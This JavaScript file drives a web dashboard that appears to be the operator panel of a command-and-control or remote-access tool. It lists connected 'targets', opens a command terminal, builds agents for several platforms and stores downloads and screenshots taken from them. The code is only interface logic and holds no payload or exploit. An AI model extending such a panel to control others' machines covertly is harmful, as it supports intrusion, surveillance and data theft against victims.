// Global variables
let currentAgent = null;
let commandHistory = [];
let historyIndex = -1;

// Initialize when document loads
document.addEventListener('DOMContentLoaded', function() {
    // Initialize tabs
    const tabButtons = document.querySelectorAll('.tab-button');
    const tabPanes = document.querySelectorAll('.tab-pane');
    
    tabButtons.forEach(button => {
        button.addEventListener('click', () => {
            const tabName = button.getAttribute('data-tab');
            console.log('Switching to tab:', tabName);
            
            // Remove active class from all buttons and panes
            tabButtons.forEach(btn => btn.classList.remove('active'));
            tabPanes.forEach(pane => pane.classList.remove('active'));
            
            // Add active class to clicked button and corresponding pane
            button.classList.add('active');
            const targetPane = document.getElementById(`${tabName}-tab`);
            if (targetPane) {
                targetPane.classList.add('active');
                // Update content based on tab
                switch(tabName) {
                    case 'agents':
                        updateAgentsList();
                        break;
                    case 'command':
                        updateCommandCenter();
                        break;
                    case 'build':
                        initializeBuildPanel();
                        break;
                    case 'storage':
                        updateStorage();
                        break;
                }
            }
        });
    });

    // Start periodic updates for agents
    updateAgentsList();
    setInterval(updateAgentsList, 5000);
});

// Agents Tab Functions
function updateAgentsList() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const targetsList = document.getElementById('targets-list');
            if (!targetsList) return;

            if (agents.length === 0) {
                targetsList.innerHTML = `
                    <div class="no-agents">
                        <span class="material-icons">devices_off</span>
                        <p>No agents connected</p>
                    </div>`;
                return;
            }

            targetsList.innerHTML = agents.map(agent => `
                <div class="agent-item" data-id="${agent.id}">
                    <div class="agent-header">
                        <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                        <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                    </div>
                    <div class="agent-details">
                        <span><i class="material-icons">computer</i>${agent.hostname || 'Unknown'}</span>
                        <span><i class="material-icons">person</i>${agent.username || 'Unknown'}</span>
                        <span><i class="material-icons">router</i>${agent.ip}</span>
                    </div>
                    <div class="agent-actions">
                        <button onclick="commandAgent(${agent.id})" title="Command">
                            <span class="material-icons">terminal</span>
                        </button>
                        <button onclick="terminateAgent(${agent.id})" title="Terminate">
                            <span class="material-icons">power_settings_new</span>
                        </button>
                    </div>
                </div>
            `).join('');
        });
}

// Command Center Functions
function updateCommandCenter() {
    fetch('/api/targets')
        .then(response => response.json())
        .then(agents => {
            const agentList = document.getElementById('agent-list');
            if (!agentList) return;

            agentList.innerHTML = agents.map(agent => `
                <div class="agent-card ${currentAgent === agent.id ? 'active' : ''}" 
                     onclick="selectAgent(${agent.id})">
                    <div class="status-badge ${isAgentActive(agent.last_seen) ? 'online' : 'offline'}"></div>
                    <div class="agent-info">
                        <div class="agent-name">${agent.alias || `Agent_${agent.id}`}</div>
                        <div class="agent-os">${agent.os_type || 'Unknown'}</div>
                    </div>
                </div>
            `).join('');
        });
}

// Build Tab Functions
function initializeBuildPanel() {
    const buildPanel = document.querySelector('.build-panel');
    buildPanel.innerHTML = `
        <h2>Build Agent</h2>
        <div class="build-options">
            <div class="option-group">
                <label>Platform</label>
                <select id="platform">
                    <option value="windows">Windows</option>
                    <option value="linux">Linux</option>
                    <option value="macos">MacOS</option>
                </select>
            </div>
            <div class="option-group">
                <label>Architecture</label>
                <select id="arch">
                    <option value="x64">x64</option>
                    <option value="x86">x86</option>
                </select>
            </div>
            <button onclick="buildAgent()" class="build-button">
                <span class="material-icons">build</span>
                Build Agent
            </button>
        </div>
        <div class="build-status"></div>
    `;
}

// Storage Tab Functions
function updateStorage() {
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            const storageContent = document.querySelector('.storage-content');
            storageContent.innerHTML = `
                <div class="storage-section">
                    <h3>Downloads</h3>
                    <div class="file-list" id="downloads-list"></div>
                </div>
                <div class="storage-section">
                    <h3>Screenshots</h3>
                    <div class="file-list" id="screenshots-list"></div>
                </div>
                <div class="upload-section">
                    <input type="file" id="file-upload" hidden>
                    <button onclick="document.getElementById('file-upload').click()">
                        <span class="material-icons">upload_file</span>
                        Upload File
                    </button>
                </div>
            `;
            updateFileList('downloads-list', data.downloads);
            updateFileList('screenshots-list', data.screenshots);
        });
}

// Helper Functions
function isAgentActive(lastSeen) {
    const lastSeenDate = new Date(lastSeen);
    const now = new Date();
    return (now - lastSeenDate) < 30000; // 30 seconds
}

function commandAgent(agentId) {
    currentAgent = agentId;
    document.querySelector('[data-tab="command"]').click();
}

function selectAgent(agentId) {
    currentAgent = agentId;
    document.querySelectorAll('.agent-card').forEach(card => {
        card.classList.toggle('active', card.getAttribute('data-id') == agentId);
    });
    
    const terminal = document.querySelector('.agent-terminal');
    const noAgentMessage = document.querySelector('.no-agent-selected');
    
    terminal.style.display = 'flex';
    noAgentMessage.style.display = 'none';
    document.getElementById('terminal-input').focus();
} 